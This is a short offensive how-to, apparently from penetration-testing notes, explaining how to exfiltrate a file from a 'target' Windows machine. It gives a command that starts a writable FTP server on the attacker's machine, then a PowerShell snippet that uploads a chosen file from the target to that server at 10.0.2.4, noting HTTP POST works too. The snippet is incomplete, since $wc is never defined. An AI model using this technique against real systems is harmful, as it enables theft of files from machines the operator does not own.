Start a local FTP server on your own machine.

e.g.:

```bash
sudo python3 -m pyftpdlib -w -p 21
```

Then on the target execute the following powershell script. Replace the IP with your own machine. And the file name with the file you wish to upload.

```powershell
$target = "ftp://10.0.2.4/test_file.txt"
$file = "C:\Users\admin\Desktop\ftptest\test_file.txt"

$resp = $wc.UploadFile($target, $file)
```

This powershell command should also works with HTTP servers that support POST file upload instead of FTP.
